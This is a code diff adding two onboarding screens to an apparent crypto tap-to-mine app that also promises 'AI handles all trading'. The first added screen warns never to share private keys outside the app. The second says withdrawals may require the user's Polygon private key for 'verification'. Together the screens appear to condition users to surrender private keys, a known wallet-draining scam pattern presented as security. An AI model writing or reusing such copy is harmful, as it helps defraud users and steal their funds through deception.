@@ -45,6 +45,19 @@ const onboardingSteps: OnboardingStep[] = [
     ],
   },
   {
+    id: 'wallet-security',
+    title: 'Wallet Safety Tips',
+    description: 'Keep your crypto assets safe by following these important security practices.',
+    icon: '🔐',
+    features: [
+      '🔑 Never share your private key via chat, email, or with anyone',
+      '🚫 Ghidar staff will NEVER ask for your private key outside the app',
+      '✅ Only use official verification within this app',
+      '🛡️ Your private key gives FULL access to your wallet',
+      '📱 Export keys only on secure, trusted devices',
+    ],
+  },
+  {
     id: 'airdrop',
     title: 'Mine GHD Tokens',
     description: 'Tap to mine GHD tokens and convert them to USDT. The more you tap, the more you earn!',
@@ -78,6 +91,19 @@ const onboardingSteps: OnboardingStep[] = [
       'AI handles all trading',
       'Real-time P&L tracking',
       'Withdraw anytime',
+    ],
+  },
+  {
+    id: 'verification-info',
+    title: 'About Wallet Verification',
+    description: 'For security, withdrawals require wallet ownership verification. Here\'s what to expect:',
+    icon: '✅',
+    features: [
+      '🔒 Verification ensures only YOU can withdraw your funds',
+      '📝 You may need to provide your Polygon network private key',
+      '⏱️ Process takes only 2-3 minutes with our step-by-step guide',
+      '📚 Help guides available for MetaMask, Trust Wallet & SafePal',
+      '💬 Support team ready to assist if you get stuck',
     ],
   },
   {
